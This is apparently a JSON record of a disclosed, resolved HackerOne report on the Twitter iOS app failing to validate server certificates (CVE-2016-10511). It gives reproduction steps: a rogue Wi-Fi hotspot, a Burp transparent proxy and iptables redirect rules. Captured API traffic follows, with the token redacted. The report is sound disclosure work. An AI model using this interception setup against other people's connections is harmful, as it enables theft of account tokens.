@@ -1,0 +1,135 @@
+{
+  "id": 168538,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjg1Mzg=",
+  "url": "https://hackerone.com/reports/168538",
+  "title": "Twitter iOS fails to validate server certificate and sends oauth token",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2016-09-15T08:58:11.908Z",
+  "submitted_at": "2016-09-15T08:58:11.908Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "floyd",
+    "url": "/floyd",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/111/469/c180556a9581571521f1f7fad2da4776fc9fa9c6_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 61,
+    "url": "https://hackerone.com/x",
+    "handle": "x",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "X / xAI",
+      "twitter_handle": "XSecurity",
+      "website": "https://x.com",
+      "about": "X helps you create and share ideas and information instantly, without barriers."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2016-10511"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-12-23T14:34:45.368Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-11-23T14:34:32.267Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Twitter on iOS newest two versions (6.62 and 6.62.1) are affected, other versions not tested. Tested independently on two different iPhone 6 with iOS version 9.3.3 and 9.3.5 without Jailbreak. The iPhone were without any mobileconfig profiles installed - *no* we did not install any CA certificate in the CA store of the device. Really stock iPhones. The Twitter app does not check the SSL/TLS certificate of https://api.twitter.com . A transparent proxy setup (eg. burp suite in transparent mode) is sufficient to exploit. Steps to reproduce:\n1. Start Burp or other Proxy software in transparent mode. Setting \"Generate CA-signed per-host certificates\", which means the CA cert of Burp is used, which is *not* trusted on the iPhones.\n2. Start rogue Wifi access point (eg. on the same machine as burp)\n3. Redirect all incoming HTTPS traffic on the rogue Wifi access point to the transparent proxy. We simply used on Linux:\niptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to $BURP_IP:8080\niptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080\n4. Connect with the iOS device to the Wifi access point\n5. Open Twitter app on iOS\n6. In burp only the calls to api.twitter.com are visible and include sensitive authentication information etc.\n\nThis is the information we saw for two different accounts in burp which includes the oauth token etc.:\n\nGET /1.1/help/settings.json?include_zero_rate=true&settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1\nHost: api.twitter.com\n█████████\nX-Twitter-Client-Version: 6.62\nX-Twitter-Polling: true\nX-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B\nX-Twitter-Client-Language: de\nX-B3-TraceId: cc8ac1aea2ba5628\nx-spdy-bypass: 1\nAccept: */*\nAccept-Language: de\nAccept-Encoding: gzip, deflate\nX-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC\nUser-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)\nConnection: close\nX-Twitter-API-Version: 5\nX-Twitter-Client-Limit-Ad-Tracking: 1\nX-Twitter-Client: Twitter-iPhone\n\n\n\nHTTP/1.1 304 Not Modified\ncache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0\nconnection: close\ncontent-length: 0\ncontent-security-policy: default-src 'self'; connect-src 'self'; font-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; frame-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; img-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; media-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; object-src 'none'; script-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; style-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXFVRWY2LFNZ2C2Y3PNZTGSZY%3D&ro=false;\ncontent-type: text/html;charset=utf-8\ndate: Thu, 15 Sep 2016 08:33:18 GMT\nexpires: Tue, 31 Mar 1981 05:00:00 GMT\nlast-modified: Thu, 15 Sep 2016 08:33:18 GMT\npragma: no-cache\nserver: tsa_b\nset-cookie: guest_id=v1%3A147392839826657964; Domain=.twitter.com; Path=/; Expires=Sat, 15-Sep-2018 08:33:18 UTC\nstatus: 304 Not Modified\nstrict-transport-security: max-age=631138519\nx-access-level: read-write\nx-client-event-enabled: true\nx-connection-hash: 40e91f874332181942e1454b13ccaa6a\nx-content-type-options: nosniff\nx-frame-options: SAMEORIGIN\nx-rate-limit-limit: 15\nx-rate-limit-remaining: 12\nx-rate-limit-reset: 1473929244\nx-response-time: 29\nx-transaction: cc8ac1aea2ba5628\nx-twitter-response-tags: BouncerExempt\nx-twitter-response-tags: BouncerCompliant\nx-xss-protection: 1; mode=block\n\n\n\nGET /1.1/help/settings.json?include_zero_rate=true&settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1\nHost: api.twitter.com\n█████████\nX-Twitter-Client-Version: 6.62\nX-Twitter-Polling: true\nX-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B\nX-Twitter-Client-Language: de\nX-B3-TraceId: 796651628eef7eed\nx-spdy-bypass: 1\nAccept: */*\nAccept-Language: de\nAccept-Encoding: gzip, deflate\nX-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC\nUser-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)\nConnection: close\nX-Twitter-API-Version: 5\nX-Twitter-Client-Limit-Ad-Tracking: 1\nX-Twitter-Client: Twitter-iPhone\n\n\n\nHTTP/1.1 304 Not Modified\ncache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0\nconnection: close\ncontent-length: 0\ncontent-security-policy: default-src 'self'; connect-src 'self'; font-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; frame-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; img-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; media-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; object-src 'none'; script-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; style-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXFVRWY2LFNZ2C2Y3PNZTGSZY%3D&ro=false;\ncontent-type: text/html;charset=utf-8\ndate: Thu, 15 Sep 2016 08:34:36 GMT\nexpires: Tue, 31 Mar 1981 05:00:00 GMT\nlast-modified: Thu, 15 Sep 2016 08:34:36 GMT\npragma: no-cache\nserver: tsa_b\nset-cookie: guest_id=v1%3A147392847623972314; Domain=.twitter.com; Path=/; Expires=Sat, 15-Sep-2018 08:34:36 UTC\nstatus: 304 Not Modified\nstrict-transport-security: max-age=631138519\nx-access-level: read-write\nx-client-event-enabled: true\nx-connection-hash: e980abd0bd35e3bf0b8c693e8a12f636\nx-content-type-options: nosniff\nx-frame-options: SAMEORIGIN\nx-rate-limit-limit: 15\nx-rate-limit-remaining: 11\nx-rate-limit-reset: 1473929244\nx-response-time: 44\nx-transaction: 796651628eef7eed\nx-twitter-response-tags: BouncerExempt\nx-twitter-response-tags: BouncerCompliant\nx-xss-protection: 1; mode=block\n",
+  "bounty_amount": "2100.0",
+  "formatted_bounty": "$2,100",
+  "weakness": {
+    "id": 32,
+    "name": "Cryptographic Issues - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2016-12-23T14:34:32.320Z",
+  "allow_singular_disclosure_after": -295836748.45523465,
+  "singular_disclosure_allowed": true,
+  "vote_count": 38,
+  "voters": [
+    "bogdantc",
+    "hunter",
+    "spam404",
+    "kasser",
+    "floyd",
+    "dmatrix",
+    "pr0f0x01",
+    "malcolmx",
+    "0x4141",
+    "madrobot",
+    "and 28 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.1,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
